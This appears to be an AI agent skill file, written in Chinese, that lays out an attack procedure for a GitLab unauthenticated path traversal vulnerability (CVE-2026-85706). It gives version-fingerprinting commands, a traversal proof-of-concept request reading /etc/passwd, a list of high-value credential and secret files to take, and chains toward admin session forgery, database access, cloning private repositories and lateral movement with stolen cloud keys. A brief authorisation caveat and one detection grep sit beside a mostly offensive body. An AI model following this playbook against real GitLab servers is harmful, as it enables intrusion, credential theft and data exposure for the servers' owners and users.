---
name: gitlab-path-traversal-file-read
description: >-
  GitLab CE/EE CVE-2026-85706 — Repository Commits API 路径穿越任意文件读取。
  CVSS 10.0，未认证单请求即读服务器任意文件。CISA KEV 2026-09-11。
  影响 18.7~19.3.1，修复 19.1.8/19.2.6/19.3.2。
  用户点名 GitLab、CVE-2026-85706、`/api/v4/projects`、自托管 GitLab、
  commits API、path traversal 时使用。
  GraphQL 面走 `gitlab-graphql-unauth`；Gitea diffpatch 走 `gitea-diffpatch-rce`。
---

# GitLab CE/EE 路径穿越任意文件读（CVE-2026-85706）

## 漏洞概要

| 字段 | 值 |
|------|-----|
| CVE | CVE-2026-85706 |
| CVSS | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N) |
| EPSS | 12% (82 percentile) |
| 类型 | Path Traversal (CWE-22) + Missing Auth (CWE-306) |
| 影响版本 | CE/EE 18.7 ~ 19.1.7, 19.2.0 ~ 19.2.5, 19.3.0 ~ 19.3.1 |
| 修复版本 | 19.1.8 / 19.2.6 / 19.3.2 |
| 在野利用 | ✅ 2026-09-11 起全网扫描（Rapid7/watchTowr 确认）|
| KEV | 2026-09-11 (联邦截止 Sep 14) |
| 勒索 | Unknown |
| 关联 | Red Heron 48h 武器化 Gitea RCE；同周 GitLab 大批量扫描 |

## 根因

`/api/v4/projects/{id}/repository/commits/` 端点的 `file.path` 参数：
1. **无认证**：未要求任何 token/session
2. **无路径限制**：可用 `../` 穿越到仓库外的服务器文件系统

单个 HTTP POST 请求即可读取 GitLab 服务器上 gitaly/gitlab-rails 服务账户可读的任意文件。

## 作业步骤（授权站）

### 1. 指纹确认

```bash
# 版本探测（公开 API，无需认证）
curl -s https://TARGET/api/v4/version
# 返回 {"version":"19.2.3","revision":"xxx"} → 受影响

# 备选：页面底部 GitLab 版本、/help 页面
curl -s https://TARGET/help | grep -oP 'GitLab.*?(\d+\.\d+\.\d+)'
```

**受影响版本范围**：
- `18.7.x` ~ `19.1.7`
- `19.2.0` ~ `19.2.5`  
- `19.3.0` ~ `19.3.1`

### 2. 漏洞验证

```bash
# 需要一个可见的 project ID（公开项目即可）
# 先列公开项目
curl -s "https://TARGET/api/v4/projects?visibility=public&per_page=5" | python3 -m json.tool

# 路径穿越读 /etc/passwd（PoC 验证）
curl -s -X POST "https://TARGET/api/v4/projects/{PROJECT_ID}/repository/commits/" \
  -H "Content-Type: application/json" \
  -d '{
    "branch": "main",
    "commit_message": "test",
    "actions": [{"action": "create", "file_path": "../../../../../../../../etc/passwd", "content": ""}]
  }'
```

> ⚠️ 具体利用参数以实际目标响应为准。watchTowr 确认单请求低复杂度。

### 3. 高价值文件读取

命中后立刻读以下文件（组合链）：

| 文件 | 价值 |
|------|------|
| `/etc/passwd` | 用户枚举 |
| `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` | Rails secret_key_base → 伪造 session/CSRF |
| `/opt/gitlab/embedded/service/gitlab-rails/config/database.yml` | PostgreSQL 凭据 |
| `/var/opt/gitlab/gitlab-rails/etc/gitlab.yml` | SMTP/LDAP/OmniAuth 配置 |
| `/var/opt/gitlab/.ssh/authorized_keys` | SSH 密钥 |
| `/var/opt/gitlab/gitlab-rails/shared/registry/config.yml` | Docker Registry 凭据 |
| `/etc/gitlab/gitlab.rb` | 全局配置（初始 root 密码、外部URL、SMTP密码）|
| `/var/opt/gitlab/postgresql/.pgpass` | PostgreSQL 密码文件 |
| `~/.aws/credentials` 或 `/root/.aws/credentials` | 云 AK |

### 4. 组合链

- **secrets.yml → Session 伪造**：Rails secret → 伪造管理员 session → 全权访问
- **database.yml → 直连 PostgreSQL**：如果 DB 端口可达 → 全库读取
- **SSH 密钥 → 代码仓库**：clone 所有 private 仓库
- **Docker Registry → 镜像拉取**：生产镜像含源码/凭据
- **云 AK → 横向**：S3/OSS/EC2

### 5. 检测日志

```bash
# 在 GitLab 服务器上检查（应急响应）
grep -r "repository/commits" /var/log/gitlab/gitlab-rails/production.log | grep -i "file_path.*\.\."
```

## 成功口径

- L1：确认版本在受影响范围
- **L2**：成功读取 `/etc/passwd` 或 `secrets.yml`
- **L3**：利用泄露凭据获得管理员权限或数据库访问

## 不要做

- 不要在非授权 GitLab 实例上测试
- 不要修改/删除仓库数据
- 写 commit 类操作需评估影响（如果 API 允许写入）

## 衔接

- GitLab GraphQL 面 → `gitlab-graphql-unauth`（CVE-2026-19478 / CVE-2026-87719）
- Gitea RCE → `gitea-diffpatch-rce`（CVE-2026-60004）
- 拿到凭据后 → `credential-harvest` → 横向 `internal-tunnel`
- CI/CD 投毒 → `ci-cd-attack-testing`
